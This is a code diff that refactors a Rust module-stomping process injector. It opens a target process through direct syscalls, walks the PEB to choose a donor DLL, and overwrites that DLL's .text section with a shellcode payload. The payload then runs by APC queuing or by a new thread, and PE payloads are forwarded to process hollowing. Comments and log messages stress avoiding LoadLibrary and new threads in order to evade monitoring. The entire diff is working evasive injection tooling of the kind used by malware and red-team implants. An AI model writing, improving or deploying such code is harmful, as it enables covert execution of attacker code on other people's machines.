@@ -207,13 +207,14 @@ fn dll_basename(path: &str) -> &str {
 /// `min_text_size` bytes. Modules matching any exclusion pattern are skipped.
 #[cfg(windows)]
 unsafe fn collect_peb_candidates(
-    h_proc: *mut winapi::ctypes::c_void,
+    h_proc: *mut std::ffi::c_void,
     peb_addr: usize,
     min_text_size: usize,
     operator_exclusions: &[String],
     builtin_exclusions: &[&str],
 ) -> Result<Vec<DonorDll>> {
-    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 
     // Read Ldr pointer from PEB (offset 0x18 on x86_64).
     let mut ldr_ptr = 0usize;
@@ -275,7 +276,7 @@ unsafe fn collect_peb_candidates(
             // Read PE headers from target process to locate the .text section.
             let mut dos_header: IMAGE_DOS_HEADER = std::mem::zeroed();
             let (s, _) = nt_read_proc!(h_proc, dll_base as u64, &mut dos_header);
-            if s < 0 || dos_header.e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+            if s < 0 || dos_header.e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
                 let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                 if next_flink == current {
                     break;
@@ -297,7 +298,7 @@ unsafe fn collect_peb_candidates(
             }
 
             // Validate PE signature.
-            if nt_headers.Signature != winapi::um::winnt::IMAGE_NT_SIGNATURE {
+            if nt_headers.Signature != windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE {
                 let next_flink = u64::from_le_bytes(entry[0..8].try_into().unwrap()) as usize;
                 if next_flink == current {
                     break;
@@ -326,12 +327,12 @@ unsafe fn collect_peb_candidates(
                 }
 
                 // Look for .text section.
-                if &sec.Name[..5] == b".text" && *sec.Misc.VirtualSize() as usize >= min_text_size {
+                if &sec.Name[..5] == b".text" && sec.Misc.VirtualSize as usize >= min_text_size {
                     candidates.push(DonorDll {
                         name: name_str.clone(),
                         base: dll_base,
                         text_rva: sec.VirtualAddress,
-                        text_size: *sec.Misc.VirtualSize(),
+                        text_size: sec.Misc.VirtualSize,
                     });
                     break;
                 }
@@ -400,16 +401,16 @@ fn select_donor<'a>(candidates: &'a [DonorDll], payload_len: usize) -> Option<&'
 /// heavily monitored events.
 #[cfg(windows)]
 unsafe fn try_execute_via_apc(
-    h_proc: *mut winapi::ctypes::c_void,
-    _pid: u32,
-    exec_addr: *mut winapi::ctypes::c_void,
+    h_proc: *mut std::ffi::c_void,
+    pid: u32,
+    exec_addr: *mut std::ffi::c_void,
 ) -> bool {
-    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32};
-    use winapi::um::winnt::PROCESS_QUERY_INFORMATION;
-    use winapi::um::winnt::THREAD_SET_CONTEXT;
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32};
+    use windows_sys::Win32::System::Threading::PROCESS_QUERY_INFORMATION;
+    use windows_sys::Win32::System::Threading::THREAD_SET_CONTEXT;
 
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+    if snap == crate::win_types::INVALID_HANDLE_VALUE {
         return false;
     }
 
@@ -453,14 +454,13 @@ unsafe fn try_execute_via_apc(
     }
 
     let mut found = false;
-    let pid = std::process::id();
     loop {
         if te.th32OwnerProcessID == pid && te.th32ThreadID != 0 {
             let mut h_thread: usize = 0;
             let mut cid = [0u64; 2];
             cid[0] = te.th32ThreadID as u64;
-            let mut oa: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-            oa.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+            let mut oa: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+            oa.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
             let thread_access = (THREAD_SET_CONTEXT | PROCESS_QUERY_INFORMATION) as u64;
             let open_ok = crate::syscall!(
@@ -506,10 +506,10 @@ unsafe fn try_execute_via_apc(
 /// This is used only when APC injection fails (no alertable threads found).
 #[cfg(windows)]
 unsafe fn execute_via_thread(
-    h_proc: *mut winapi::ctypes::c_void,
-    exec_addr: *mut winapi::ctypes::c_void,
+    h_proc: *mut std::ffi::c_void,
+    exec_addr: *mut std::ffi::c_void,
 ) -> Result<()> {
-    use winapi::um::winnt::SYNCHRONIZE;
+    const SYNCHRONIZE: u32 = 0x00100000;
 
     let mut h_thread: usize = 0;
     let status = crate::syscall!(
@@ -545,15 +545,14 @@ unsafe fn execute_via_thread(
 #[cfg(windows)]
 impl Injector for ExistingModuleStompInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
-        use winapi::um::winnt::{
-            PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
-            PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-        };
+        use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READ;
+        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
+        use crate::win_types::PAGE_READWRITE;
 
         // If payload is a PE, delegate to process hollowing.
         let is_pe = payload_has_valid_pe_headers(payload);
         if is_pe {
-            log::info!("ExistingModuleStomp: PE payload detected, forwarding to process hollowing");
+            tracing::info!("ExistingModuleStomp: PE payload detected, forwarding to process hollowing");
             return match hollowing::windows_impl::inject_into_process(pid, payload) {
                 Ok(_) => Ok(()),
                 Err(e) => Err(anyhow!("process hollowing PE injection failed: {}", e)),
@@ -575,9 +574,9 @@ impl Injector for ExistingModuleStompInjector {
             // ── Step 1: Open target process ──────────────────────────────
             let mut client_id = [0u64; 2];
             client_id[0] = pid as u64;
-            let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+            let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
             obj_attr.Length =
-                std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
             let mut h_proc_val: usize = 0;
             let access_mask = (PROCESS_VM_OPERATION
@@ -607,7 +606,7 @@ impl Injector for ExistingModuleStompInjector {
                     ))
                 }
             }
-            let h_proc = h_proc_val as *mut winapi::ctypes::c_void;
+            let h_proc = h_proc_val as *mut std::ffi::c_void;
 
             macro_rules! close_h {
                 () => {
@@ -634,9 +633,9 @@ impl Injector for ExistingModuleStompInjector {
                 })?;
 
             type NtQueryInfoProcess = unsafe extern "system" fn(
-                winapi::shared::ntdef::HANDLE,
+                crate::win_types::HANDLE,
                 u32,
-                *mut winapi::ctypes::c_void,
+                *mut std::ffi::c_void,
                 u32,
                 *mut u32,
             ) -> i32;
@@ -669,7 +668,7 @@ impl Injector for ExistingModuleStompInjector {
                 e
             })?;
 
-            log::debug!(
+            tracing::debug!(
                 "ExistingModuleStomp: found {} candidate DLLs in target pid={}",
                 candidates.len(),
                 pid,
@@ -687,7 +686,7 @@ impl Injector for ExistingModuleStompInjector {
                 ),
             };
 
-            log::info!(
+            tracing::info!(
                 "ExistingModuleStomp: selected '{}' at {:#x} (.text RVA={:#x}, size={} bytes) \
                  for {}-byte payload (NO LoadLibrary call)",
                 donor.name,
@@ -697,7 +696,7 @@ impl Injector for ExistingModuleStompInjector {
                 payload.len(),
             );
 
-            let text_addr = (donor.base + donor.text_rva as usize) as *mut winapi::ctypes::c_void;
+            let text_addr = (donor.base + donor.text_rva as usize) as *mut std::ffi::c_void;
 
             // ── Step 5: Verify re-protection is possible ─────────────────
             // Try a no-op protection change to verify the region is not
@@ -772,19 +771,19 @@ impl Injector for ExistingModuleStompInjector {
             // Try APC first (no new thread), fall back to NtCreateThreadEx.
             let apc_ok = try_execute_via_apc(h_proc, pid, text_addr);
             if apc_ok {
-                log::info!(
+                tracing::info!(
                     "ExistingModuleStomp: shellcode executing via APC on alertable thread \
                      (no new thread created)"
                 );
             } else {
-                log::info!(
+                tracing::info!(
                     "ExistingModuleStomp: no alertable thread found, falling back to \
                      NtCreateThreadEx for execution"
                 );
                 execute_via_thread(h_proc, text_addr)?;
             }
 
-            log::info!(
+            tracing::info!(
                 "ExistingModuleStomp: successfully stomped {}-byte payload into '{}' \
                  (NO LoadLibrary, NO new thread{})",
                 payload.len(),
